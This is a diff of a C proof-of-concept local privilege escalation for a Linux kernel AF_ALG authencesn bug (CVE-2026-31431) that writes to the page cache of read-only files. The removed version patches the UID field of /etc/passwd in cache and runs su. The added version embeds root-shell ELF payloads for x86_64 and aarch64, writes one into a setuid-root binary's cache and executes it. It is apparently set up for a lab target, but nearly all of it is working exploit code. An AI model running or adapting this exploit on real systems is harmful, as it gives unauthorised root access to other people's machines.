@@ -1,27 +1,21 @@
 /*
- * copyfail – CVE-2026-31431 page-cache write without write permission
+ * copyfail - CVE-2026-31431 page-cache write without write permission
  *
- * Root cause: the authencesn AEAD template writes a 4-byte ESN (Extended
- * Sequence Number) past the end of its output scatter-list.  When the output
- * is backed by splice'd page-cache pages, those bytes are written to the page
- * cache without requiring write permission.
+ * This is the single-file PoCLab LPE:
+ *   1. Start as uid=1000.
+ *   2. Open /usr/bin/suid-target read-only.  It is a setuid-root copy of
+ *      busybox created by the lab rootfs.
+ *   3. Use the authencesn AF_ALG bug to overwrite only that file's page cache
+ *      with a tiny root-shell ELF payload.  The on-disk file is unchanged.
+ *   4. execve("/usr/bin/suid-target").  The kernel applies the original
+ *      setuid-root mode, but executes the poisoned page-cache contents.
  *
- * Exploitation path (implemented here):
- *   1. Verify the primitive: write "XXXX" into a read-only temp file's cache.
- *   2. Locate the current user's UID field in /etc/passwd and flip it to "0".
- *   3. exec `su <user>` – su reads the poisoned cache, treats the user as
- *      uid=0, and hands us a root shell.  The on-disk /etc/passwd is untouched.
- *
- * Attack surface: AF_ALG socket family, AEAD mode.
- * Required config: see pocs/copyfail/kernel.config
- *
- * Usage: make poc POC=pocs/copyfail/poc.c
+ * Required kernel config: see pocs/copyfail/kernel.config
  */
 #define _GNU_SOURCE
 #include <endian.h>
 #include <errno.h>
 #include <fcntl.h>
-#include <pwd.h>
 #include <stdint.h>
 #include <stdio.h>
 #include <stdlib.h>
@@ -37,24 +31,22 @@
 #define err(fmt, ...)  fprintf(stderr, "[-] " fmt "\n", ##__VA_ARGS__)
 #define die(fmt, ...)  do { err(fmt, ##__VA_ARGS__); exit(EXIT_FAILURE); } while (0)
 
-/* ── AF_ALG constants ────────────────────────────────────────────────────── */
+#define SUID_TARGET "/usr/bin/suid-target"
+#define AEAD_ASSOCLEN 8
+#define AEAD_AUTHSIZE 4
+
 #ifndef AF_ALG
-# define AF_ALG  38
+# define AF_ALG 38
 #endif
 #ifndef SOL_ALG
 # define SOL_ALG 279
 #endif
 
-/* setsockopt optnames (SOL_ALG level) */
 #define ALG_SET_KEY            1
 #define ALG_SET_AEAD_AUTHSIZE  5
-
-/* sendmsg cmsg types */
 #define ALG_SET_IV             2
 #define ALG_SET_OP             3
 #define ALG_SET_AEAD_ASSOCLEN  4
-
-/* operation values */
 #define ALG_OP_DECRYPT         0
 
 struct sockaddr_alg {
@@ -65,38 +57,119 @@ struct sockaddr_alg {
     uint8_t  salg_name[64];
 };
 
-/* struct af_alg_iv from linux/if_alg.h */
 struct af_alg_iv {
     uint32_t ivlen;
     uint8_t  iv[0];
 };
 
-/*
- * Authenc key blob (rtnetlink-style attribute):
- *   [u16 rta_len=8][u16 rta_type=1][__be32 enckeylen=16][32 bytes key]
- * The key value is irrelevant – we only need setkey() to succeed.
- */
-static const uint8_t AUTHENC_KEY[8 + 32] = {
+static const uint8_t authenc_key[8 + 32] = {
 #if __BYTE_ORDER == __LITTLE_ENDIAN
     0x08, 0x00, 0x01, 0x00,
 #else
     0x00, 0x08, 0x00, 0x01,
 #endif
     0x00, 0x00, 0x00, 0x10,
-    /* 32 zero bytes follow (default-initialized) */
 };
 
-/* ── Core write primitive ────────────────────────────────────────────────── */
-/*
- * Writes exactly 4 bytes into fd's page cache at byte offset `off`,
- * without requiring write permission on the file.
- *
- * Mechanism: one bogus AEAD-decrypt via AF_ALG whose ciphertext is supplied
- * by splice()'ing from the target file's page cache.  authencesn's in-place
- * optimization reuses the splice'd source pages as the (failed) decrypt's
- * destination, so the 4 payload bytes have already been written to the cache
- * by the time authentication rejects the operation.
- */
+#if defined(__aarch64__)
+static const uint8_t root_shell_elf[] = {
+  0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
+  0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0xb7, 0x00, 0x01, 0x00, 0x00, 0x00,
+  0x78, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00,
+  0x00, 0x00, 0x00, 0x00, 0xf0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+  0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x38, 0x00, 0x01, 0x00, 0x40, 0x00,
+  0x03, 0x00, 0x02, 0x00, 0x01, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00,
+  0x78, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x78, 0x00, 0x40, 0x00,
+  0x00, 0x00, 0x00, 0x00, 0x78, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00,
+  0x60, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x60, 0x00, 0x00, 0x00,
+  0x00, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+  0x00, 0x00, 0x80, 0xd2, 0x01, 0x00, 0x80, 0xd2, 0x02, 0x00, 0x80, 0xd2,
+  0xa8, 0x12, 0x80, 0xd2, 0x01, 0x00, 0x00, 0xd4, 0x00, 0x00, 0x80, 0xd2,
+  0x01, 0x00, 0x80, 0xd2, 0x02, 0x00, 0x80, 0xd2, 0x68, 0x12, 0x80, 0xd2,
+  0x01, 0x00, 0x00, 0xd4, 0x80, 0x01, 0x00, 0x10, 0xe1, 0x00, 0x00, 0x10,
+  0xe2, 0x03, 0x1f, 0xaa, 0xa8, 0x1b, 0x80, 0xd2, 0x01, 0x00, 0x00, 0xd4,
+  0x20, 0x00, 0x80, 0xd2, 0xa8, 0x0b, 0x80, 0xd2, 0x01, 0x00, 0x00, 0xd4,
+  0xd0, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+  0x00, 0x00, 0x00, 0x00, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00,
+  0x00, 0x2e, 0x73, 0x68, 0x73, 0x74, 0x72, 0x74, 0x61, 0x62, 0x00, 0x2e,
+  0x74, 0x65, 0x78, 0x74, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0b, 0x00, 0x00, 0x00,
+  0x01, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+  0x78, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x78, 0x00, 0x00, 0x00,
+  0x00, 0x00, 0x00, 0x00, 0x60, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00,
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
+  0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xd8, 0x00, 0x00, 0x00,
+  0x00, 0x00, 0x00, 0x00, 0x11, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
+};
+#elif defined(__x86_64__)
+static const uint8_t root_shell_elf[] = {
+  0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
+  0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x3e, 0x00, 0x01, 0x00, 0x00, 0x00,
+  0x78, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00,
+  0x00, 0x00, 0x00, 0x00, 0xf0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+  0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x38, 0x00, 0x01, 0x00, 0x40, 0x00,
+  0x03, 0x00, 0x02, 0x00, 0x01, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00,
+  0x78, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x78, 0x00, 0x40, 0x00,
+  0x00, 0x00, 0x00, 0x00, 0x78, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00,
+  0x60, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x60, 0x00, 0x00, 0x00,
+  0x00, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+  0x48, 0x31, 0xff, 0x48, 0x31, 0xf6, 0x48, 0x31, 0xd2, 0xb8, 0x77, 0x00,
+  0x00, 0x00, 0x0f, 0x05, 0x48, 0x31, 0xff, 0x48, 0x31, 0xf6, 0x48, 0x31,
+  0xd2, 0xb8, 0x75, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0x8d, 0x3d, 0x31,
+  0x00, 0x00, 0x00, 0x48, 0x8d, 0x35, 0x1a, 0x00, 0x00, 0x00, 0x48, 0x31,
+  0xd2, 0xb8, 0x3b, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xbf, 0x01, 0x00, 0x00,
+  0x00, 0xb8, 0x3c, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x0f, 0x1f, 0x40, 0x00,
+  0xd0, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+  0x00, 0x00, 0x00, 0x00, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00,
+  0x00, 0x2e, 0x73, 0x68, 0x73, 0x74, 0x72, 0x74, 0x61, 0x62, 0x00, 0x2e,
+  0x74, 0x65, 0x78, 0x74, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0b, 0x00, 0x00, 0x00,
+  0x01, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+  0x78, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x78, 0x00, 0x00, 0x00,
+  0x00, 0x00, 0x00, 0x00, 0x60, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00,
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
+  0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xd8, 0x00, 0x00, 0x00,
+  0x00, 0x00, 0x00, 0x00, 0x11, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
+};
+#else
+# error "copyfail PoCLab payload supports aarch64 and x86_64 only"
+#endif
+
+static ssize_t splice_all(int in, off_t *off_in, int out, size_t len)
+{
+    size_t done = 0;
+
+    while (done < len) {
+        ssize_t n = splice(in, off_in, out, NULL, len - done, 0);
+        if (n < 0) {
+            if (errno == EINTR)
+                continue;
+            return -1;
+        }
+        if (n == 0)
+            break;
+        done += (size_t)n;
+    }
+
+    return (ssize_t)done;
+}
+
 static int patch_chunk(int fd, off_t off, const uint8_t four[4])
 {
     int ctrl = -1, op = -1;
@@ -104,32 +177,43 @@ static int patch_chunk(int fd, off_t off, const uint8_t four[4])
     int rc = -1;
 
     ctrl = socket(AF_ALG, SOCK_SEQPACKET, 0);
-    if (ctrl < 0) { perror("socket(AF_ALG)"); goto out; }
+    if (ctrl < 0) {
+        perror("socket(AF_ALG)");
+        goto out;
+    }
 
     struct sockaddr_alg sa = { .salg_family = AF_ALG };
     memcpy(sa.salg_type, "aead", 5);
     memcpy(sa.salg_name, "authencesn(hmac(sha256),cbc(aes))",
-           sizeof "authencesn(hmac(sha256),cbc(aes))");
+           sizeof("authencesn(hmac(sha256),cbc(aes))"));
 
-    if (bind(ctrl, (struct sockaddr *)&sa, sizeof sa) < 0) {
-        perror("bind(AF_ALG: authencesn(hmac(sha256),cbc(aes)))"); goto out;
+    if (bind(ctrl, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
+        perror("bind(authencesn)");
+        goto out;
     }
     if (setsockopt(ctrl, SOL_ALG, ALG_SET_KEY,
-                   AUTHENC_KEY, sizeof AUTHENC_KEY) < 0) {
-        perror("setsockopt(ALG_SET_KEY)"); goto out;
+                   authenc_key, sizeof(authenc_key)) < 0) {
+        perror("setsockopt(ALG_SET_KEY)");
+        goto out;
     }
-    if (setsockopt(ctrl, SOL_ALG, ALG_SET_AEAD_AUTHSIZE, NULL, 4) < 0) {
-        perror("setsockopt(ALG_SET_AEAD_AUTHSIZE)"); goto out;
+
+    unsigned int authsize = AEAD_AUTHSIZE;
+    if (setsockopt(ctrl, SOL_ALG, ALG_SET_AEAD_AUTHSIZE,
+                   &authsize, sizeof(authsize)) < 0) {
+        perror("setsockopt(ALG_SET_AEAD_AUTHSIZE)");
+        goto out;
     }
 
     op = accept(ctrl, NULL, 0);
-    if (op < 0) { perror("accept(AF_ALG)"); goto out; }
+    if (op < 0) {
+        perror("accept(AF_ALG)");
+        goto out;
+    }
 
-    /* AAD: 4 dummy bytes + 4-byte payload.
-     * The authencesn template writes the ESN (= our four bytes) at `off`
-     * in the page-cache pages that were splice'd in below. */
-    uint8_t aad[8] = { 'A','A','A','A', four[0], four[1], four[2], four[3] };
-    struct iovec iov = { .iov_base = aad, .iov_len = sizeof aad };
+    uint8_t aad[AEAD_ASSOCLEN] = {
+        'A', 'A', 'A', 'A', four[0], four[1], four[2], four[3],
+    };
+    struct iovec iov = { .iov_base = aad, .iov_len = sizeof(aad) };
 
     union {
         struct cmsghdr align;
@@ -139,215 +223,136 @@ static int patch_chunk(int fd, off_t off, const uint8_t four[4])
             CMSG_SPACE(sizeof(uint32_t))
         ];
     } cbuf;
-    memset(&cbuf, 0, sizeof cbuf);
+    memset(&cbuf, 0, sizeof(cbuf));
 
     struct msghdr msg = {
-        .msg_iov        = &iov,
-        .msg_iovlen     = 1,
-        .msg_control    = cbuf.buf,
-        .msg_controllen = sizeof cbuf.buf,
+        .msg_iov = &iov,
+        .msg_iovlen = 1,
+        .msg_control = cbuf.buf,
+        .msg_controllen = sizeof(cbuf.buf),
     };
 
     struct cmsghdr *cm = CMSG_FIRSTHDR(&msg);
     cm->cmsg_level = SOL_ALG;
-    cm->cmsg_type  = ALG_SET_OP;
-    cm->cmsg_len   = CMSG_LEN(sizeof(uint32_t));
+    cm->cmsg_type = ALG_SET_OP;
+    cm->cmsg_len = CMSG_LEN(sizeof(uint32_t));
     *(uint32_t *)CMSG_DATA(cm) = ALG_OP_DECRYPT;
 
     cm = CMSG_NXTHDR(&msg, cm);
     cm->cmsg_level = SOL_ALG;
-    cm->cmsg_type  = ALG_SET_IV;
-    cm->cmsg_len   = CMSG_LEN(sizeof(struct af_alg_iv) + 16);
+    cm->cmsg_type = ALG_SET_IV;
+    cm->cmsg_len = CMSG_LEN(sizeof(struct af_alg_iv) + 16);
     struct af_alg_iv *aiv = (struct af_alg_iv *)CMSG_DATA(cm);
     aiv->ivlen = 16;
     memset(aiv->iv, 0, 16);
 
     cm = CMSG_NXTHDR(&msg, cm);
     cm->cmsg_level = SOL_ALG;
-    cm->cmsg_type  = ALG_SET_AEAD_ASSOCLEN;
-    cm->cmsg_len   = CMSG_LEN(sizeof(uint32_t));
-    *(uint32_t *)CMSG_DATA(cm) = 8;
+    cm->cmsg_type = ALG_SET_AEAD_ASSOCLEN;
+    cm->cmsg_len = CMSG_LEN(sizeof(uint32_t));
+    *(uint32_t *)CMSG_DATA(cm) = AEAD_ASSOCLEN;
 
     if (sendmsg(op, &msg, MSG_MORE) < 0) {
-        perror("sendmsg(AAD)"); goto out;
+        perror("sendmsg(AAD)");
+        goto out;
+    }
+    if (pipe(pfd) < 0) {
+        perror("pipe");
+        goto out;
     }
 
-    if (pipe(pfd) < 0) { perror("pipe"); goto out; }
-
-    size_t splice_len = (size_t)off + 4;
+    size_t splice_len = (size_t)off + AEAD_AUTHSIZE;
     off_t src_off = 0;
-    if (splice(fd, &src_off, pfd[1], NULL, splice_len, 0) < 0) {
-        perror("splice(file→pipe)"); goto out;
+    if (splice_all(fd, &src_off, pfd[1], splice_len) != (ssize_t)splice_len) {
+        perror("splice(file->pipe)");
+        goto out;
     }
-    if (splice(pfd[0], NULL, op, NULL, splice_len, 0) < 0) {
-        perror("splice(pipe→op)"); goto out;
+    if (splice_all(pfd[0], NULL, op, splice_len) != (ssize_t)splice_len) {
+        perror("splice(pipe->op)");
+        goto out;
     }
 
-    /* recv() triggers the in-kernel decrypt; the ESN write has already fired */
-    uint8_t *sink = malloc(8 + (size_t)off);
-    if (sink) {
-        (void)recv(op, sink, 8 + (size_t)off, 0);
-        free(sink);
+    size_t recv_len = AEAD_ASSOCLEN + splice_len;
+    uint8_t *sink = malloc(recv_len);
+    if (!sink) {
+        perror("malloc");
+        goto out;
     }
+
+    (void)recv(op, sink, recv_len, 0);
+    free(sink);
 
     rc = 0;
 out:
     if (pfd[0] >= 0) close(pfd[0]);
     if (pfd[1] >= 0) close(pfd[1]);
-    if (op   >= 0)   close(op);
-    if (ctrl >= 0)   close(ctrl);
+    if (op >= 0) close(op);
+    if (ctrl >= 0) close(ctrl);
     return rc;
 }
 
-/* ── /etc/passwd UID field locator ───────────────────────────────────────── */
-/* Returns the byte offset of the UID field for `username` in /etc/passwd. */
-static off_t find_uid_offset(const char *username)
+static void overwrite_page_cache(int fd, const uint8_t *data, size_t len)
 {
-    int fd = open("/etc/passwd", O_RDONLY);
-    if (fd < 0) { perror("open(/etc/passwd)"); return -1; }
+    size_t chunks = (len + 3) / 4;
 
-    char buf[65536];
-    ssize_t n = read(fd, buf, sizeof buf - 1);
-    close(fd);
-    if (n <= 0) { perror("read(/etc/passwd)"); return -1; }
-    buf[n] = '\0';
+    for (size_t i = 0; i < chunks; i++) {
+        uint8_t four[4] = { 0, 0, 0, 0 };
+        size_t off = i * 4;
+        size_t take = len - off < 4 ? len - off : 4;
 
-    size_t namelen = strlen(username);
-    char *line = buf;
-    while (line < buf + n) {
-        char *eol = memchr(line, '\n', (size_t)((buf + n) - line));
-        size_t linelen = eol ? (size_t)(eol - line) : (size_t)((buf + n) - line);
+        memcpy(four, data + off, take);
+        if (patch_chunk(fd, (off_t)off, four) < 0)
+            die("patch_chunk failed at payload offset %zu", off);
 
-        if (linelen > namelen + 1 &&
-            memcmp(line, username, namelen) == 0 &&
-            line[namelen] == ':') {
-            /* name:x:UID:GID:... – skip two colons to reach UID field */
-            char *c1 = memchr(line,      ':', linelen);
-            if (!c1) break;
-            char *c2 = memchr(c1 + 1, ':', linelen - (size_t)(c1 + 1 - line));
-            if (!c2) break;
-            return (off_t)((c2 + 1) - buf);
-        }
-        if (!eol) break;
-        line = eol + 1;
+        if (i == 0 || i + 1 == chunks || (i + 1) % 32 == 0)
+            info("patched %zu/%zu bytes", off + take, len);
     }
-
-    err("user '%s' not found in /etc/passwd", username);
-    return -1;
 }
 
-/* ── Exploit ─────────────────────────────────────────────────────────────── */
-static void exploit(const char *username, uid_t uid)
+static void exploit(void)
 {
     struct utsname u;
-    uname(&u);
-    info("Kernel : %s %s %s", u.sysname, u.release, u.machine);
-    info("PoC    : copyfail – CVE-2026-31431 page-cache write w/o write perm");
-    info("User   : %s  uid=%u", username, uid);
+    struct stat st;
 
-    /* ── Step 1: verify the primitive with a temp file ── */
-    const char *tmppath = "/tmp/copyfail_target";
-    uint8_t orig[8];
-    memset(orig, 'A', sizeof orig);
+    if (uname(&u) == 0)
+        info("Kernel : %s %s %s", u.sysname, u.release, u.machine);
+    info("PoC    : copyfail CVE-2026-31431 single-file LPE");
+    info("Target : %s", SUID_TARGET);
+    info("Payload: %zu bytes", sizeof(root_shell_elf));
 
-    int wfd = open(tmppath, O_WRONLY | O_CREAT | O_TRUNC, 0644);
-    if (wfd < 0) die("open(O_WRONLY): %s", strerror(errno));
-    if (write(wfd, orig, sizeof orig) != (ssize_t)sizeof orig)
-        die("write: %s", strerror(errno));
-    close(wfd);
-    chmod(tmppath, 0444);
+    int fd = open(SUID_TARGET, O_RDONLY);
+    if (fd < 0)
+        die("open(%s): %s", SUID_TARGET, strerror(errno));
+    if (fstat(fd, &st) < 0)
+        die("fstat(%s): %s", SUID_TARGET, strerror(errno));
+    if (!S_ISREG(st.st_mode))
+        die("%s is not a regular file", SUID_TARGET);
+    if (st.st_uid != 0 || !(st.st_mode & S_ISUID))
+        die("%s must be setuid-root; mode=%o uid=%u",
+            SUID_TARGET, st.st_mode & 07777, st.st_uid);
+    if ((off_t)sizeof(root_shell_elf) > st.st_size)
+        die("payload is larger than %s (%zu > %lld)",
+            SUID_TARGET, sizeof(root_shell_elf), (long long)st.st_size);
 
-    int rfd = open(tmppath, O_RDONLY);
-    if (rfd < 0) die("open(O_RDONLY): %s", strerror(errno));
+    overwrite_page_cache(fd, root_shell_elf, sizeof(root_shell_elf));
+    close(fd);
 
-    info("Before : first 8 bytes of read-only file = \"%.8s\"", orig);
-    info("Writing \"XXXX\" at offset 0 via authencesn ESN out-of-bounds ...");
-
-    const uint8_t marker[4] = { 'X', 'X', 'X', 'X' };
-    if (patch_chunk(rfd, 0, marker) < 0)
-        die("patch_chunk failed – check CONFIG_CRYPTO_USER_API_AEAD=y and CONFIG_CRYPTO_AUTHENCESN=y");
-    close(rfd);
-
-    uint8_t after[8] = {0};
-    int vfd = open(tmppath, O_RDONLY);
-    if (vfd >= 0) { (void)read(vfd, after, sizeof after); close(vfd); }
-
-    info("After  : first 8 bytes = \"%.8s\"", after);
-    if (memcmp(after, "XXXX", 4) != 0)
-        die("page cache unchanged – kernel may be patched or AF_ALG AEAD unavailable");
-
-    ok("Primitive verified: wrote to read-only page cache without write permission");
-
-    /* ── Step 2: locate UID field in /etc/passwd ── */
-    off_t uid_off = find_uid_offset(username);
-    if (uid_off < 0)
-        die("cannot locate UID field in /etc/passwd");
-
-    ok("/etc/passwd UID field at offset %lld", (long long)uid_off);
-
-    char fieldbuf[12] = {0};
-    {
-        int pfd = open("/etc/passwd", O_RDONLY);
-        if (pfd < 0) die("open(/etc/passwd): %s", strerror(errno));
-        (void)pread(pfd, fieldbuf, sizeof fieldbuf - 1, uid_off);
-        close(pfd);
-    }
-
-    int field_len = 0;
-    while (field_len < (int)(sizeof fieldbuf - 1) && fieldbuf[field_len] != ':')
-        field_len++;
-    if (field_len == 0 || field_len > 10)
-        die("unexpected UID field length %d", field_len);
-
-    /* Same width, all zeros – /etc/passwd treats leading zeros as decimal */
-    char padded[11];
-    memset(padded, '0', field_len);
-    padded[field_len] = '\0';
-
-    ok("Patching UID: \"%.*s\" → \"%s\" (page cache only, disk untouched)",
-       field_len, fieldbuf, padded);
-
-    /* ── Step 3: flip UID field in /etc/passwd page cache ── */
-    int passwdfd = open("/etc/passwd", O_RDONLY);
-    if (passwdfd < 0) die("open(/etc/passwd): %s", strerror(errno));
-
-    for (int off = 0; off < field_len; off += 4) {
-        uint8_t chunk[4] = {0};
-        int take = (field_len - off < 4) ? (field_len - off) : 4;
-        if (take < 4) {
-            /* read-modify for the last partial window */
-            if (pread(passwdfd, chunk, 4, uid_off + off) < 0)
-                die("pread: %s", strerror(errno));
-        }
-        memcpy(chunk, padded + off, (size_t)take);
-        if (patch_chunk(passwdfd, uid_off + off, chunk) < 0)
-            die("patch_chunk failed at offset %d", off);
-    }
-    close(passwdfd);
-
-    ok("/etc/passwd page cache mutated – '%s' now appears as uid=0", username);
-    ok("Exec'ing `su %s` to cash out ...", username);
-    info("(Run `echo 3 > /proc/sys/vm/drop_caches` as root to restore)");
-
-    /* ── Step 4: cash out via su ── */
-    execlp("su", "su", username, (char *)NULL);
-    perror("execlp(su)");
-    exit(1);
+    ok("page cache mutated; execve(%s) should yield uid=0(root)", SUID_TARGET);
+    char *argv[] = { (char *)SUID_TARGET, NULL };
+    char *envp[] = {
+        "PATH=/bin:/sbin:/usr/bin:/usr/sbin",
+        "TERM=xterm",
+        NULL,
+    };
+    execve(SUID_TARGET, argv, envp);
+    die("execve(%s): %s", SUID_TARGET, strerror(errno));
 }
 
 int main(void)
 {
     uid_t uid = getuid();
-    struct passwd *pw = getpwuid(uid);
-    if (!pw) die("getpwuid: %s", strerror(errno));
-
-    info("copyfail  pid=%d  user=%s  uid=%d", getpid(), pw->pw_name, uid);
-
-    if (uid == 0) {
-        info("Already root.");
-        return 0;
-    }
-
-    exploit(pw->pw_name, uid);
+    uid_t euid = geteuid();
+    info("copyfail pid=%d uid=%u euid=%u", getpid(), uid, euid);
+    exploit();
     return 0;
 }
